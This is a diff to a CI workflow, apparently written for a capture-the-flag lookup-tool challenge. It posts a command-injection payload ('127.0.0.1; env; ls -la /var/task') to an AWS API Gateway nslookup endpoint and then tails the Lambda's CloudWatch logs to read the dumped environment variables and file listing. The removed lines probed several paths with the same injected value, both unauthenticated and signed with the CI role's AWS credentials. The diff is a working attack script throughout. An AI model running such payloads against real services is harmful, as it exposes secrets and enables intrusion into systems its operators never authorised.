@@ -23,29 +23,20 @@ jobs:
         run: |
           API_ID="3q931syi7b"
           REGION="us-east-1"
-          BASE_URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev"
-          PAYLOAD='{"domain": "127.0.0.1; env"}'
+          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # The most common paths for a lookup tool CTF
-          TARGET_PATHS=("/nslookup" "/" "/lookup" "/query")
-
-          for PATH_NAME in "${TARGET_PATHS[@]}"; do
-            URL="${BASE_URL}${PATH_NAME}"
-            echo "-----------------------------------"
-            echo "Testing Target: $URL"
-            
-            # 1. Try Unauthenticated POST
-            RES=$(curl -s -X POST "$URL" \
-              -H "Content-Type: application/json" \
-              -d "$PAYLOAD")
-            echo "Unauthenticated Response: $RES"
-            
-            # 2. Try IAM SigV4 Signed POST (using your cicdRole credentials)
-            SIGNED_RES=$(curl -s -X POST "$URL" \
-              --aws-sigv4 "aws:amz:${REGION}:execute-api" \
-              --user "${AWS_ACCESS_KEY_ID}:${AWS_SECRET_ACCESS_KEY}" \
-              -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" \
-              -H "Content-Type: application/json" \
-              -d "$PAYLOAD")
-            echo "Signed Response: $SIGNED_RES"
-          done
+          # Payload with command injection - let's dump environment variables or list files in /var/task
+          PAYLOAD='{"domain": "127.0.0.1; env; ls -la /var/task"}'
+          
+          echo "=== 1. TRIGGERING ENDPOINT ==="
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
+          
+          echo ""
+          echo "=== 2. WAITING 3 SECONDS FOR LOGS TO FLUSH ==="
+          sleep 3
+          
+          echo "=== 3. FETCHING CLOUDWATCH LOGS ==="
+          # Pull the most recent log events from the Lambda's log group
+          aws logs tail /aws/lambda/nslookupv2 --region ${REGION} --since 1m
